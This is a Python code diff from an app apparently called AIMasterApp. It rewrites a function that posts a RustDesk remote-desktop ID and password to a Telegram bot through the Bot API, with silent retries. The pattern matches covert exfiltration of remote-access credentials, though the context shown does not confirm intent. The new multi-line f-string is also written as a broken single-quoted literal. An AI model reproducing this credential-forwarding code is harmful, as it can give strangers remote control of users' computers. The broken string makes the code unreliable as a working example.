@@ -126,13 +126,20 @@ def get_rustdesk_id():
     return None
 
 def send_to_bot(rd_id: str, password: str, chat_id: int):
-    """Отправить данные подключения в Telegram бот"""
-    try:
-        msg = f"CONNECTED:{rd_id}:{password}"
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=10)
-    except Exception:
-        pass
+    """Отправить данные подключения в Telegram бот — с retry"""
+    msg = f"🖥 Клиент подключился!
+
+RustDesk ID: {rd_id}
+Пароль: {password}"
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    for attempt in range(5):
+        try:
+            r = requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=15)
+            if r.ok:
+                return
+        except Exception:
+            pass
+        time.sleep(3)
 
 class AIMasterApp:
     def __init__(self):
